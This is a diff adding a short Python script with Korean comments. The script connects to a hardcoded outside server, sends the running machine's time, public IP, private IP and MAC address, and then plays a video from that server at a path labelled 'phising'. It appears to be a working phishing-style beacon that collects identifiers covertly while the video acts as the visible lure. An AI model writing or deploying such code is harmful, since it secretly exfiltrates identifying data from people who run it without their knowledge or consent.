@@ -1,0 +1,47 @@
+from datetime import datetime
+from requests import get #공인 ip를 가져오기 위힘
+import socket #사설 ip를 가져오기 위함
+import getmac #MAC주소 가져오기 위함
+import cv2
+
+HOST = '155.230.52.54'
+PORT = 3307
+
+client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+client_socket.connect((HOST, PORT))
+
+# 키보드로 입력한 문자열을 서버로 전송하고
+# 서버에서 에코되어 돌아오는 메시지를 받으면 화면 출력
+
+# 시간, 공인 IP, 사설 IP, MAC 정보 setting
+current_time = datetime.now()
+public_ip = get("https://api.ipify.org").text
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.connect(('8.8.8.8', 80))
+private_ip = s.getsockname()[0]
+s.close()
+
+message = str(current_time) + " " + public_ip + " " + private_ip + " " + getmac.get_mac_address()
+
+# 서버로 전송
+client_socket.send(message.encode())
+
+
+client_socket.close()
+
+# opencv 비디오 자동 재생
+capture = cv2.VideoCapture('http://155.230.52.54:8080/ksj/phising/1.mp4')
+
+while capture.isOpened():
+    run, frame = capture.read()
+    if not run:
+        print("[프레임 수신 불가] - 종료합니다")
+        break
+    img = cv2.cvtColor(frame, cv2.IMREAD_COLOR)
+    cv2.imshow('video', frame)
+    if cv2.waitKey(30) & 0xFF == ord('q'):
+        break
+
+capture.release()
+cv2.destroyAllWindows()
